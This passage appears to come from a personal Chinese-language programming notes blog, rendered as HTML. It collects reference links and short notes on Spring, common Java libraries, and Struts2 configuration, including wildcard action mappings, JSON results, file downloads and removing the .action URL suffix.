href=\"https://juejin.im/post/5b77d33151882542d23a0823\" target=\"_blank\" rel=\"noopener\">ApplicationContext 与 BeanFactory 区别 - 掘金</a><br><a href=\"https://securenai.github.io/spring/spring_page2/\" target=\"_blank\" rel=\"noopener\">Spring Container | securenai SITE</a> </p>\n<p><a href=\"https://juejin.im/post/5a6476cdf265da3e243b9e61\" target=\"_blank\" rel=\"noopener\">Spring第一篇【介绍Spring、引入Spring、Spring六大模块】 - 掘金</a></p>\n<p><a href=\"https://www.zhihu.com/question/24863332\" target=\"_blank\" rel=\"noopener\">什么是面向切面编程AOP？ - 知乎</a></p>\n<p><a href=\"https://www.cnblogs.com/maikucha/p/10145169.html\" target=\"_blank\" rel=\"noopener\">Spring|@Autowired与new的区别 - 无聊的三文鸡 - 博客园</a></p>\n<p>autowired 動態</p>\n<p><a href=\"https://stackoverflow.com/questions/54193516/how-to-use-qualifier-dynamically-specifying-parameters\" target=\"_blank\" rel=\"noopener\">java - how to use ‘@Qualifier’ dynamically specifying parameters? - Stack Overflow</a><br><a href=\"https://www.coder.work/article/56406\" target=\"_blank\" rel=\"noopener\">spring - 如何使用运行时“限定符”变量动态注入服务？ - IT工具网</a></p>\n<p>autowired 常見錯誤<br><a href=\"https://wujincheng.gitbooks.io/brian/java/spring/autowired.html\" target=\"_blank\" rel=\"noopener\">Autowired · Brian的雜記</a></p>\n<p><a href=\"https://www.cnblogs.com/pangyangqi/p/10010866.html\" target=\"_blank\" rel=\"noopener\">@Autowired和static的关系 - 左手程序，右手诗 - 博客园</a></p>\n<h2 id=\"Class\"><a href=\"#Class\" class=\"headerlink\" title=\"Class\"></a>Class</h2><p>com.google.gson.annotations.Expose<br>GSON<br><a href=\"https://xnfood.com.tw/android-json-gson-2/\" target=\"_blank\" rel=\"noopener\">《Android》『JSON &amp; GSON』- GSON 的基本程式語法教學 (下) - 賽肥膩膩の食旅生活誌</a></p>\n<p>JAVA IO<br><a href=\"https://ethan-imagination.blogspot.com/2018/12/javase-gettingstarted-019.html\" target=\"_blank\" rel=\"noopener\">無邊界的想像力: Java SE 入門教學 - IO 流</a><br><a href=\"https://blog.csdn.net/fengxingzhe001/article/details/67640083\" target=\"_blank\" rel=\"noopener\">java读取文件API速度对比_Java_fengxingzhe001的专栏-CSDN博客</a><br><a href=\"https://dotblogs.com.tw/cylcode/2018/09/21/170510\" target=\"_blank\" rel=\"noopener\">Java讀取寫出檔案FileReader和FileWriter | CYL菜鳥攻略 - 點部落</a></p>\n<p>java.io.BufferedWriter<br>java.io.ByteArrayOutputStream<br>java.io.FileInputStream<br>java.io.FileOutputStream<br>java.io.IOException<br>java.io.PrintWriter<br>java.io.Serializable<br>java.io.Writer<br>java.io.File</p>\n<p>要曲檔名 file.getName<br>路徑 file.getPath 會包含檔名</p>\n<p>要怎麼曲資料夾路徑<br><a href=\"https://stackoverflow.com/questions/3657157/how-do-i-get-a-files-directory-using-the-file-object\" target=\"_blank\" rel=\"noopener\">java - How do I get a file’s directory using the File object? - Stack Overflow</a></p>\n<p>File.getParent()  可能會抓到 null<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">File file = <span class=\"keyword\">new</span> File(<span class=\"string\">\"test.txt\"</span>);</span><br><span class=\"line\">String parent = file.getParent();</span><br></pre></td></tr></table></figure></p>\n<p>所以推薦</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">parent = file.getAbsoluteFile().getParent();</span><br></pre></td></tr></table></figure>\n<p>Path</p>\n<p><a href=\"https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/282/\" target=\"_blank\" rel=\"noopener\">Java NIO之擁抱Path和Files | 程式前沿</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">File file = <span class=\"keyword\">new</span> File(<span class=\"string\">\"C:/my.ini\"</span>);</span><br><span class=\"line\">Path p1 = file.toPath();</span><br><span class=\"line\">p1.toFile();</span><br><span class=\"line\">file.toURI();</span><br></pre></td></tr></table></figure>\n<p>MATH<br>java.math.BigDecimal</p>\n<p>ip<br>java.net.InetAddress</p>\n<p><a href=\"https://docs.oracle.com/javase/7/docs/api/java/net/InetAddress.html\" target=\"_blank\" rel=\"noopener\">InetAddress (Java Platform SE 7 )</a><br><a href=\"https://openhome.cc/Gossip/JavaGossip-V2/InetAddress.htm\" target=\"_blank\" rel=\"noopener\">InetAddress 類別</a><br><a href=\"https://blog.xuite.net/x_3kkk/java/13809146-%E5%88%A9%E7%94%A8Java%E7%8D%B2%E5%BE%97IP%E5%9C%B0%E5%9D%80\" target=\"_blank\" rel=\"noopener\">利用Java獲得IP地址 @ Java 咖啡 :: 隨意窩 Xuite日誌</a></p>\n<p>處理時間格式<br>java.text.SimpleDateFormat<br><a href=\"https://www.ewdna.com/2009/01/javadatecalendardateformatsimpledatefor.html\" target=\"_blank\" rel=\"noopener\">Java：日期時間格式化輸出入處理：Date、Calendar、SimpleDateFormat @ 符碼記憶</a></p>\n<p>java.util<br>Contains the collections framework, legacy collection classes, event model, date and time facilities, internationalization, and miscellaneous utility classes (a string tokenizer, a random-number generator, and a bit array).</p>\n<p>java.util.ArrayList<br>java.util.Calendar<br>java.util.Collections<br>java.util.Date<br>java.util.HashMap<br>java.util.HashSet<br>java.util.LinkedHashMap<br>java.util.List<br>java.util.Map<br>java.util.Set<br>java.util.UUID</p>\n<p>javax.crypto.IllegalBlockSizeException<br><a href=\"https://yq.aliyun.com/articles/533581\" target=\"_blank\" rel=\"noopener\">JAVA实现AES加密-云栖社区-阿里云</a></p>\n<p>javax.persistence<br>Java Persistence is the API for the management for persistence and object/relational mapping.</p>\n<p>javax.persistence.Column<br>javax.persistence.Entity<br>javax.persistence.FetchType<br>javax.persistence.GeneratedValue<br>javax.persistence.GenerationType<br>javax.persistence.Id<br>javax.persistence.JoinColumn<br>javax.persistence.ManyToOne<br>javax.persistence.SequenceGenerator<br>javax.persistence.Table<br>javax.persistence.Temporal<br>javax.persistence.TemporalType</p>\n<p>javax.servlet.http.HttpServletRequest<br>javax.servlet.http.HttpServletResponse</p>\n<p>net.sf.json.JSONObject<br><a href=\"https://blog.csdn.net/u013514928/article/details/79114814\" target=\"_blank\" rel=\"noopener\">JSON用法—net.sf.json.JSONObject_Java_午夜阳光-CSDN博客</a></p>\n<p>org.apache.commons.io.FileUtils<br><a href=\"https://blog.csdn.net/wangmx1993328/article/details/80136921\" target=\"_blank\" rel=\"noopener\">org.apache.commons.io.FileUtils 详解<em>Java</em>蚩尤后裔-CSDN博客</a><br><a href=\"https://www.iteye.com/blog/zhoualine-1770014\" target=\"_blank\" rel=\"noopener\">Apache Commons工具集简介 - 坚持学习 - ITeye博客</a></p>\n<p>org.apache.commons.lang.builder.ToStringBuilder<br>org.apache.commons.lang.builder.ToStringStyle<br>org.apache.commons.lang.StringUtils<br><a href=\"http://java.openyu.org/2014/03/commons-lang3-tostringbuilder_18.html\" target=\"_blank\" rel=\"noopener\">Commons Lang使用ToStringBuilder - 就是愛Java</a><br><a href=\"https://blog.csdn.net/YuanMxy/article/details/81012697\" target=\"_blank\" rel=\"noopener\">[Java基础]StringUtils.join()方法与String.join()方法的使用_Java_YuanMxy’Home-CSDN博客</a></p>\n<p>org.apache.commons.io.IOUtils<br><a href=\"https://stackoverflow.com/questions/36861650/should-i-close-the-inputstream-of-org-apache-commons-io-ioutils\" target=\"_blank\" rel=\"noopener\">java - Should I close the InputStream of org.apache.commons.io.IOUtils - Stack Overflow</a></p>\n<p><a href=\"http://java-logy.blogspot.com/2007/11/commons-logging.html\" target=\"_blank\" rel=\"noopener\">Javalogy–Java的學習筆記: Commons Logging</a><br>org.apache.commons.logging.Log<br>org.apache.commons.logging.LogFactory<br>org.apache.log4j.Logger</p>\n<p><a href=\"http://tw.gitbook.net/apache_poi/apache_poi_hyperlink.html\" target=\"_blank\" rel=\"noopener\">Apache POI超鏈接 - POI基礎教程</a><br>org.apache.poi.ss.usermodel.Row<br>org.apache.poi.xssf.usermodel.XSSFRow<br>org.apache.poi.xssf.usermodel.XSSFSheet<br>org.apache.poi.xssf.usermodel.XSSFWorkbook</p>\n<p>org.hibernate.Query<br><a href=\"https://openhome.cc/Gossip/HibernateGossip/SecondHibernate.html\" target=\"_blank\" rel=\"noopener\">第二個 Hibernate</a></p>\n<p>org.junit.runner.RunWith<br>org.junit.Test<br><a href=\"https://blog.csdn.net/u010675669/article/details/86574956\" target=\"_blank\" rel=\"noopener\">JUnit 5和JUnit 4比较_Java_javaZhong的博客-CSDN博客</a><br><a href=\"https://openhome.cc/Gossip/JUnit/JUnit4.html\" target=\"_blank\" rel=\"noopener\">使用 JUnit 4.x</a></p>\n<p>org.springframework.beans.BeanUtils<br><a href=\"https://blog.csdn.net/langqiao123/article/details/72961332\" target=\"_blank\" rel=\"noopener\">Spring 中的BeanUtils与apache中的BeanUtils差别_Java_langqiao123的专栏-CSDN博客</a></p>\n<p>org.springframework.beans.factory.annotation.Autowired<br><a href=\"https://sites.google.com/site/stevenattw/java/spring-framework/ioc---annotation-autowired\" target=\"_blank\" rel=\"noopener\">IoC - Annotation (@Autowired) - 史帝芬心得筆記</a></p>\n<p>org.springframework.beans.factory.annotation.Qualifier<br><a href=\"https://blog.csdn.net/benjamin_whx/article/details/24659745\" target=\"_blank\" rel=\"noopener\">详解@Autowired、@Qualifier和@Required_Java_Benjamin-CSDN博客</a></p>\n<p>org.springframework.context.support.AbstractApplicationContext<br>org.springframework.context.support.ClassPathXmlApplicationContext<br><a href=\"https://segmentfault.com/a/1190000015047555\" target=\"_blank\" rel=\"noopener\">Spring 入门学习二之IOC - 个人文章 - SegmentFault 思否</a></p>\n<p>org.springframework.stereotype.Repository</p>\n<p>org.springframework.stereotype.Service<br><a href=\"https://www.cnblogs.com/hellxz/p/7282454.html\" target=\"_blank\" rel=\"noopener\">SSM简单整合教程&amp;测试事务 - 东北小狐狸 - 博客园</a><br><a href=\"https://ithelp.ithome.com.tw/articles/10194079\" target=\"_blank\" rel=\"noopener\">Day 8 Spring MVC-@Service的使用 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<p>org.springframework.test.context.ContextConfiguration<br><a href=\"https://blog.csdn.net/HeatDeath/article/details/79364562\" target=\"_blank\" rel=\"noopener\">Sprin g整合 JUnit4 测试时，使用 @ContextConfiguration 注解引入多个配置文件_Java_HeatDeath的博客-CSDN博客</a></p>\n<p>org.springframework.test.context.junit4.SpringJUnit4ClassRunner<br>org.springframework.transaction.annotation.Propagation<br><a href=\"https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/312313/\" target=\"_blank\" rel=\"noopener\">Spring中@Transactional用法詳細介紹 | 程式前沿</a></p>\n<p>org.springframework.transaction.annotation.Transactional<br><a href=\"https://www.cnblogs.com/leeSmall/p/10306672.html\" target=\"_blank\" rel=\"noopener\">框架源码系列十一：事务管理（Spring事务管理的特点、事务概念学习、Spring事务使用学习、Spring事务管理API学习、Spring事务源码学习） - 小不点啊 - 博客园</a><br><a href=\"https://www.ibm.com/developerworks/cn/java/j-master-spring-transactional-use/index.html\" target=\"_blank\" rel=\"noopener\">透彻的掌握 Spring 中@transactional 的使用</a></p>\n<p>org.springframework.web.bind.ServletRequestUtils<br><a href=\"https://www.zybuluo.com/Cesar/note/393815\" target=\"_blank\" rel=\"noopener\">Spring中好用的工具类 - 作业部落 Cmd Markdown 编辑阅读器</a></p>\n<p>Calendar<br><a href=\"https://www.itread01.com/content/1568272383.html\" target=\"_blank\" rel=\"noopener\">為什麼不建議使用Date，而是使用Java8新的時間和日期API？ - IT閱讀</a></p>\n<h2 id=\"Struts\"><a href=\"#Struts\" class=\"headerlink\" title=\"Struts\"></a>Struts</h2><h3 id=\"詳細教學\"><a href=\"#詳細教學\" class=\"headerlink\" title=\"詳細教學\"></a>詳細教學</h3><p><a href=\"https://juejin.im/post/5a64772a6fb9a01cb31647e3\" target=\"_blank\" rel=\"noopener\">Struts2第二篇【开发步骤、执行流程、struts - 掘金</a><br><a href=\"https://juejin.im/post/5a6476cc51882573392cd64b\" target=\"_blank\" rel=\"noopener\">Struts2第三篇【Action开发方式、通配符、Struts常量、跳转全局视图、action节点默认配置】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6476ed6fb9a01cbc6e7e44\" target=\"_blank\" rel=\"noopener\">Spring第四篇【Intellij idea环境下、Struts2和Spring整合】 - 掘金</a><br><a href=\"https://juejin.im/post/5a64770ef265da3e54692b05\" target=\"_blank\" rel=\"noopener\">Struts2第五篇【类型转换器、全局、局部类型转换器】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6476e36fb9a01c975a58cf\" target=\"_blank\" rel=\"noopener\">Struts2第六篇【文件上传和下载】 - 掘金</a><br><a href=\"https://juejin.im/post/5a647729518825732d7fb34b\" target=\"_blank\" rel=\"noopener\">Struts2第七篇【介绍拦截器、自定义拦截器、执行流程、应用】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6476a6518825732b19f002\" target=\"_blank\" rel=\"noopener\">Struts第八篇【资源国际化、对比JSP的资源国际化】 - 掘金</a><br><a href=\"https://juejin.im/post/5a64773d6fb9a01ca071ef96\" target=\"_blank\" rel=\"noopener\">Struts2第九篇【OGNL、valueStack详解】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6476f3f265da3e33046e47\" target=\"_blank\" rel=\"noopener\">Struts2第十一篇【简单UI标签、数据回显】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6476cd518825732d7fb347\" target=\"_blank\" rel=\"noopener\">Struts2第十二篇【模型驱动】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6476ad51882573485a0d86\" target=\"_blank\" rel=\"noopener\">Struts2第十三篇【防止表单重复提交拦截器】 - 掘金</a></p>\n<p><a href=\"https://juejin.im/post/5aa3349ff265da23884caa6a\" target=\"_blank\" rel=\"noopener\">Struts2入门这一篇就够了 - 掘金</a></p>\n<p><a href=\"https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/303709/\" target=\"_blank\" rel=\"noopener\">Struts2的配置 struts.xml Action詳解 | 程式前沿</a></p>\n<h3 id=\"數據封裝\"><a href=\"#數據封裝\" class=\"headerlink\" title=\"數據封裝\"></a>數據封裝</h3><p>struts2 最近使用發現他在表單傳送 input 值真的很方便<br>只要對 Java 做 getXxxx , setXxxx (動態) 就能做很多設定<br>後來查到這名詞是數據封裝<br>有很多種方式很已做到<br>詳細如:<a href=\"https://www.cnblogs.com/whgk/p/6587130.html\" target=\"_blank\" rel=\"noopener\">struts2(二) 表单参数自动封装和参数类型自动转换 - 漂泊在外的程序员老王 - 博客园</a></p>\n<p><a href=\"https://blog.csdn.net/xtayfjpk/article/details/16826649\" target=\"_blank\" rel=\"noopener\">struts2转换器详解_Java_xtayfjpk的专栏-CSDN博客</a></p>\n<h3 id=\"struts-xml\"><a href=\"#struts-xml\" class=\"headerlink\" title=\"struts.xml\"></a>struts.xml</h3><ul>\n<li><a href=\"https://juejin.im/post/5a6476b1f265da3e55380273\" target=\"_blank\" rel=\"noopener\">Struts2配置文件【代码库】 - 掘金</a></li>\n<li><a href=\"https://www.cnblogs.com/fmricky/archive/2010/05/20/1740479.html\" target=\"_blank\" rel=\"noopener\">7、struts.xml配置详解 - 暗夜亡灵 - 博客园</a></li>\n<li><a href=\"https://www.jianshu.com/p/d8ba3a768447\" target=\"_blank\" rel=\"noopener\">Struts 2 result详解 - 簡書</a></li>\n<li><a href=\"https://stackoverflow.com/questions/5904821/how-to-return-http-error-status-code-and-content-in-struts2\" target=\"_blank\" rel=\"noopener\">java - How to return HTTP error status code <em>and</em> content in Struts2 - Stack Overflow</a>(未測試)</li>\n<li><a href=\"https://www.cnblogs.com/niloay/p/struts2-result.html\" target=\"_blank\" rel=\"noopener\">菜鸟学Struts2——Results - 92年程序员 - 博客园</a></li>\n<li></li>\n</ul>\n<h4 id=\"最佳程式路徑\"><a href=\"#最佳程式路徑\" class=\"headerlink\" title=\"最佳程式路徑\"></a>最佳程式路徑</h4><p>曾經第一次接觸使用 strut2<br>我常用 XML 設定如下</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">package</span> <span class=\"attr\">name</span>=<span class=\"string\">\"vvvv\"</span> <span class=\"attr\">namespace</span>=<span class=\"string\">\"/vvvv\"</span> <span class=\"attr\">extends</span>=<span class=\"string\">\"struts-default\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">name</span>=<span class=\"string\">\"insertStock\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"doInsertStock\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"vvvv.action.Stock\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">result</span> <span class=\"attr\">name</span>=<span class=\"string\">\"success\"</span>&gt;</span>/vvvv/pages/stock_update.jsp<span class=\"tag\">&lt;/<span class=\"name\">result</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">result</span> <span class=\"attr\">name</span>=<span class=\"string\">\"error\"</span>&gt;</span>/vvvv/pages/stock_insert.jsp<span class=\"tag\">&lt;/<span class=\"name\">result</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">action</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">name</span>=<span class=\"string\">\"addStock\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"doAddStock\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"vvvv.action.Stock\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">result</span> <span class=\"attr\">name</span>=<span class=\"string\">\"success\"</span>&gt;</span>/vvvv/pages/stock_insert.jsp<span class=\"tag\">&lt;/<span class=\"name\">result</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">action</span>&gt;</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>通常一個 class 跟 method 對應一個設定<br>但我發現 xml 的 action method 設定不一定要放(預設是 execute)<br>每一個 method 不一定需要設定 不一定要放多個 tag 如範例<br>只要設定一個 action 就能做到了<br>可參考下面設定</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">name</span>=<span class=\"string\">\"oooo\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.oooo.action.XxxxAction\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">result</span> <span class=\"attr\">name</span>=<span class=\"string\">\"success\"</span>&gt;</span>/ooooo/oooo/success.jsp<span class=\"tag\">&lt;/<span class=\"name\">result</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">result</span> <span class=\"attr\">name</span>=<span class=\"string\">\"list\"</span>&gt;</span>/ooooo/oooo/query.jsp<span class=\"tag\">&lt;/<span class=\"name\">result</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">result</span> <span class=\"attr\">name</span>=<span class=\"string\">\"edit\"</span>&gt;</span>/ooooo/oooo/edit.jsp<span class=\"tag\">&lt;/<span class=\"name\">result</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">action</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>其他，看到優良設定<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">package</span> <span class=\"attr\">name</span>=<span class=\"string\">\"user\"</span> <span class=\"attr\">namespace</span>=<span class=\"string\">\"/\"</span> <span class=\"attr\">extends</span>=<span class=\"string\">\"struts-default\"</span>&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">name</span>=<span class=\"string\">\"*user\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.zzjmay.action.VaildateAction\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"&#123;1&#125;\"</span>&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">result</span> <span class=\"attr\">name</span>=<span class=\"string\">\"success\"</span>&gt;</span>/success.jsp<span class=\"tag\">&lt;/<span class=\"name\">result</span>&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">result</span> <span class=\"attr\">name</span>=<span class=\"string\">\"input\"</span>&gt;</span>/&#123;1&#125;.jsp<span class=\"tag\">&lt;/<span class=\"name\">result</span>&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">action</span>&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">package</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<ol>\n<li>name:邏輯上的包名</li>\n<li>namespace:名稱空間，用來區分同意struts下的相同action（注意是一種邏輯上的的路徑）</li>\n<li>extends: 繼承某個配置檔案</li>\n<li>abstract</li>\n<li>name:Action類的對映名稱</li>\n<li>class:Action類的完整路徑</li>\n<li>method:預設使用的execute()方法，如果要自定義觸發方法，需要使用method自定義</li>\n</ol>\n</blockquote>\n<p><a href=\"https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/303709/\" target=\"_blank\" rel=\"noopener\">Struts2的配置 struts.xml Action詳解 | 程式前沿</a></p>\n<p>還有更彈性設定</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">name</span>=<span class=\"string\">\"user_*_*\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"user&#123;2&#125;\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"com.gopain.&#123;1&#125;\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">result</span> <span class=\"attr\">name</span>=<span class=\"string\">\"type_&#123;2&#125;\"</span>&gt;</span>/&#123;2&#125;_page.jsp<span class=\"tag\">&lt;/<span class=\"name\">result</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">action</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>假如請求為，user_UserAction_login（不考慮namespace），其中 action中{1} 為UserAction，{2}為login，此請求會執行com.gopain.UserAction$userlogin().如果返回值為」type_login「,則會跳轉到login_page.jsp頁面。</p>\n<p>此處只是舉例，站點不宜這樣配置請求。但是對於action的name配置很實用，不要奢望一個action配置完整個站點（雖然也可以實現，而且對於訪問沒有太多影響），十分不利於管理。<br>————————————————<br>版权声明：本文为CSDN博主「gopain」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href=\"https://blog.csdn.net/gopain/java/article/details/40790523\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/gopain/java/article/details/40790523</a></p>\n</blockquote>\n<p>參考:<a href=\"https://blog.csdn.net/gopain/article/details/40790523\" target=\"_blank\" rel=\"noopener\">[Struts2] 配置文件struts.xml和web.xml詳解_網絡_gopain-CSDN博客</a></p>\n<p>管理上還請斟酌，不過用第二個方法就很方便了</p>\n<h3 id=\"與-spring-設定\"><a href=\"#與-spring-設定\" class=\"headerlink\" title=\"與 spring 設定\"></a>與 spring 設定</h3><p><a href=\"https://blog.csdn.net/shendeguang/article/details/8194871\" target=\"_blank\" rel=\"noopener\">struts2默认拦截器之autowiring_Java_shendeguang的专栏-CSDN博客</a></p>\n<h3 id=\"action-到-jsp-傳值\"><a href=\"#action-到-jsp-傳值\" class=\"headerlink\" title=\"action 到 jsp 傳值\"></a>action 到 jsp 傳值</h3><p><a href=\"https://my.oschina.net/u/3058325/blog/804000\" target=\"_blank\" rel=\"noopener\">struts2中action传值到jsp页面的3种方法 - 开源中国首席吊炸天的个人空间 - OSCHINA</a></p>\n<h2 id=\"struts2-錯誤處理\"><a href=\"#struts2-錯誤處理\" class=\"headerlink\" title=\"struts2 錯誤處理\"></a>struts2 錯誤處理</h2><p><a href=\"http://mactruecolor.blogspot.com/2011/07/struts2-404.html\" target=\"_blank\" rel=\"noopener\">起風前的相遇: Struts2 處理404錯誤的方法</a></p>\n<h3 id=\"攔截器\"><a href=\"#攔截器\" class=\"headerlink\" title=\"攔截器\"></a>攔截器</h3><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/34433146\" target=\"_blank\" rel=\"noopener\">Struts2【拦截器】就是这么简单 - 知乎</a><br><code>&lt;interceptor-stack name=&quot;defaultStack&quot;&gt;</code> 宣告攔截器…</li>\n</ul>\n<h4 id=\"JSON-設定\"><a href=\"#JSON-設定\" class=\"headerlink\" title=\"JSON 設定\"></a>JSON 設定</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">package</span> <span class=\"attr\">name</span>=<span class=\"string\">\"default\"</span> <span class=\"attr\">namespace</span>=<span class=\"string\">\"/\"</span> <span class=\"attr\">extends</span>=<span class=\"string\">\"json-default\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">global-results</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">result</span> <span class=\"attr\">name</span>=<span class=\"string\">\"dataResult\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"json\"</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!-- &lt;param name=\"root\"&gt;jsonresult_var&lt;/param&gt; 針對 action 的 變數當 json 的 root</span></span><br><span class=\"line\"><span class=\"comment\">\t\t&lt;param name=\"contentType\"&gt;text/json&lt;/param&gt;  --&gt;</span> </span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">result</span>&gt;</span></span><br><span class=\"line\">          ....</span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"http://tw.gitbook.net/struts_2/struts-2-and-json-example.html\" target=\"_blank\" rel=\"noopener\">Struts2和JSON實例 - Struts2教學</a></p>\n<p>更多設定可參考<br><a href=\"https://struts.apache.org/plugins/json/\" target=\"_blank\" rel=\"noopener\">JSON plugin</a></p>\n<h4 id=\"下載檔案\"><a href=\"#下載檔案\" class=\"headerlink\" title=\"下載檔案\"></a>下載檔案</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">result</span> <span class=\"attr\">name</span>=<span class=\"string\">\"download\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"stream\"</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">param</span> <span class=\"attr\">name</span>=<span class=\"string\">\"contentType\"</span>&gt;</span>application/octet-stream<span class=\"tag\">&lt;/<span class=\"name\">param</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">param</span> <span class=\"attr\">name</span>=<span class=\"string\">\"inputName\"</span>&gt;</span>fileStream<span class=\"tag\">&lt;/<span class=\"name\">param</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">param</span> <span class=\"attr\">name</span>=<span class=\"string\">\"contentDisposition\"</span>&gt;</span>attachment;filename=\"$&#123;fileName&#125;\"<span class=\"tag\">&lt;/<span class=\"name\">param</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">param</span> <span class=\"attr\">name</span>=<span class=\"string\">\"bufferSize\"</span>&gt;</span>1024<span class=\"tag\">&lt;/<span class=\"name\">param</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">result</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>在上述配置代碼中，分別通過 stream 結果類型的屬性設置了所要下載文件的類型、名稱和輸入流。其中 ${filename} 表示在項目運行時，將 action 中的 filename 屬性動態地填充在 ${} 中間部分，這樣就可以動態地獲取所要下載的文件名稱。</p>\n</blockquote>\n<p>通常上述關係，會做 setFileName(xxx)</p>\n<p>參考:<a href=\"http://c.biancheng.net/view/4160.html\" target=\"_blank\" rel=\"noopener\">Struts2文件下载实例</a></p>\n<h4 id=\"移除-url-action\"><a href=\"#移除-url-action\" class=\"headerlink\" title=\"移除 url .action\"></a>移除 url .action</h4><p>在 struts.xml 加入 tag 可以解決這個問題<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">struts</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">constant</span> <span class=\"attr\">name</span>=<span class=\"string\">\"struts.action.extension\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"\"</span>/&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">struts</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>不過我發現預設是 ,,action ，代表.action 跟空白也可以使用<br>上述詳細教學第三章有提到</p>\n<p><a href=\"https://stackoverflow.com/questions/17160838/struts-2-removing-action-from-url\" target=\"_blank\" rel=\"noopener\">java - Struts 2 - Removing action from url - Stack Overflow</a><br><a href=\"http://tw.gitbook.net/struts_2/how-to-remove-the-action-suffix-extension-in-struts-2.html\" target=\"_blank\" rel=\"noopener\">如何刪除Struts2動作的後綴擴展名 - Struts2教學</a></p>\n<h2 